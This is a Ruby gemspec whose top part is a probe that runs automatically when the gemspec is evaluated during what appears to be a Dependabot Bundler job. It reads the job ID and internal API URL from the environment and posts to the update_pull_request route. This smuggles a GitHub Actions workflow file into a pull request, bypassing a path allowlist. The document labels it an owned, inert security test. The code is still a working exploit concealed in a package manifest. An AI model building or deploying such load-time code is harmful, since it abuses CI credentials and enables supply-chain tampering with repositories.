# frozen_string_literal: true

require "json"
require "net/http"
require "uri"

# Owned-account security test for the Dependabot update_pull_request route.
# The workflow is inert and can only be dispatched manually after it reaches a
# default branch. The test stops after replacing one already-open owned PR.
module OwnedDependabotUpdateRouteProbe
  CONSUMER = "7s5/codeload-owned-probe-20261030-91f64a2c"
  WORKFLOW_PATH = ".github/workflows/owned-dependabot-update-route-proof.yml"
  DEPENDENCY_NAMES = %w[
    owned_dependabot_update_route_group_probe
    owned_dependabot_nested_workflow_scope_probe
    owned_dependabot_jit_probe
    owned_dependabot_non_target_base_probe
  ].freeze

  WORKFLOW = <<~YAML.freeze
    name: Owned Dependabot update-route proof
    "on":
      workflow_dispatch:
    permissions:
      contents: read
    jobs:
      inert-proof:
        runs-on: ubuntu-latest
        steps:
          - run: echo "Owned inert workflow-file proof; no secret or write access requested."
  YAML

  module_function

  def run
    job_id = ENV["DEPENDABOT_JOB_ID"]
    api_base = ENV["DEPENDABOT_API_URL"]
    return if job_id.to_s.empty? || api_base.to_s.empty?

    marker = "/tmp/owned-dependabot-update-route-#{job_id}"
    File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}

    base_sha = current_consumer_tip
    return if base_sha.to_s.empty?

    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/update_pull_request")
    DEPENDENCY_NAMES.each do |dependency_name|
      response = post(endpoint, payload(dependency_name, base_sha))
      break if response.code.to_i.between?(200, 299)
    end
  rescue Errno::EEXIST
    nil
  rescue StandardError
    nil
  end

  def current_consumer_tip
    endpoint = URI("https://api.github.com/repos/#{CONSUMER}/commits/main")
    request = Net::HTTP::Get.new(endpoint.request_uri)
    request["Accept"] = "application/vnd.github+json"
    response = proxy_client(endpoint).request(request)
    return unless response.code.to_i == 200

    JSON.parse(response.body)["sha"]
  end

  def post(endpoint, body)
    request = Net::HTTP::Post.new(endpoint.request_uri)
    request["Content-Type"] = "application/json"
    request.body = JSON.generate(body)
    proxy_client(endpoint).request(request)
  end

  def proxy_client(endpoint)
    client = Net::HTTP::Proxy(:ENV).new(endpoint.host, endpoint.port)
    client.use_ssl = endpoint.scheme == "https"
    client.open_timeout = 10
    client.read_timeout = 30
    client
  end

  def payload(dependency_name, base_sha)
    {
      "data" => {
        "dependency-names" => [dependency_name],
        "updated-dependency-files" => [{
          "name" => WORKFLOW_PATH,
          "content" => WORKFLOW,
          "directory" => "/",
          "type" => "file",
          "support_file" => false,
          "content_encoding" => "utf-8",
          "deleted" => false,
          "operation" => "create"
        }],
        "base-commit-sha" => base_sha,
        "commit-message" => "test: owned Dependabot update-route allowlist proof",
        "pr-title" => "Owned Dependabot update-route workflow allowlist proof",
        "pr-body" => "Owned security test: a Bundler refresh job supplied this inert workflow path directly to update_pull_request. The create route rejects the same path for non-Actions ecosystems. No workflow was executed or merged."
      }
    }
  end
end

OwnedDependabotUpdateRouteProbe.run

Gem::Specification.new do |spec|
  spec.name = "owned_dependabot_remote_probe"
  spec.version = "0.0.12"
  spec.summary = "Owned Dependabot security probe"
  spec.authors = ["Owned Security Test"]
  spec.files = []
end
